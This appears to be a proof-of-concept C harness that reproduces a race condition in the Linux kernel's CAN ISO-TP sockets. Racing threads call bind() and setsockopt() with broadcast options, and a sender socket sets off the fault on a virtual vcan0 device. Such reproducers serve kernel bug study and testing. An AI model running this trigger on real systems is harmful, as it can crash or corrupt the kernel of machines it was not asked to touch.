/*
[COMMIT]
fix: 2b17c400ae
parent: 440c3247cb

[COMPILE]
compiled with gcc 10.4, defconfig, with KASAN
the following kernel config is required: CONFIG_CAN, CONFIG_CAN_ISOTP, CONFIG_CAN_VCAN

[COMMENT]
need to create a VCAN device before start exploiting.
this exploit will try to create a VCAN device named vcan0, and delete it after execution. can be slow
*/

#define _GNU_SOURCE
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/isotp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <pthread.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sched.h>

unsigned long racee_delay=0, racer_delay=0;

static int fd, fd_sndr;
static struct can_isotp_options opts, opts_sndr;
static struct sockaddr_can sa, sa_sndr;
static char buf[10];

void sys_racee(void)
{
  setsockopt(fd, SOL_CAN_ISOTP, CAN_ISOTP_OPTS, &opts, sizeof(opts));
}

void sys_racer(void)
{
  bind(fd, (struct sockaddr *)&sa, sizeof(sa));
}

void setup_one(void)
{
  fd = socket(PF_CAN, SOCK_DGRAM, CAN_ISOTP);
  if (fd < 0) {
    perror("[-] create socket failed"), exit(-1);
  }

  // setup a socket for trigger the bug by sending CAN frame
  fd_sndr = socket(PF_CAN, SOCK_DGRAM, CAN_ISOTP);
  if (fd_sndr < 0) {
    perror("[-] create sender socket failed"), exit(-1);
  }
  if (bind(fd_sndr, (struct sockaddr *)&sa_sndr, sizeof(sa_sndr)) < 0) {
    perror("[-] bind sender socket failed"), exit(-1);
  }
}

void cleanup_one(void)
{
  close(fd);

  if (write(fd_sndr, buf, sizeof(buf)) <0) {
    perror("[-] send to socket failed"), exit(-1);
  }

  close(fd_sndr);
}

void do_setup(void)
{
  if (if_nametoindex("vcan0") == 0) {
    system("ip link add type vcan");
    system("ip link set vcan0 up");
  }

  memset(&sa, 0, sizeof(sa));
  sa.can_family = AF_CAN;
  sa.can_ifindex = if_nametoindex("vcan0");
  sa.can_addr.tp.rx_id = 0;
  sa.can_addr.tp.tx_id = 1;

  memset(&opts, 0, sizeof(opts));
  opts.flags = CAN_ISOTP_SF_BROADCAST;

  memset(&sa_sndr, 0, sizeof(sa_sndr));
  sa_sndr.can_family = AF_CAN;
  sa_sndr.can_ifindex = if_nametoindex("vcan0");
  sa_sndr.can_addr.tp.rx_id = 1;
  sa_sndr.can_addr.tp.tx_id = 0;
}

void do_cleanup(void)
{
  return;
}

int sanity_check(void)
{
  return 0;
}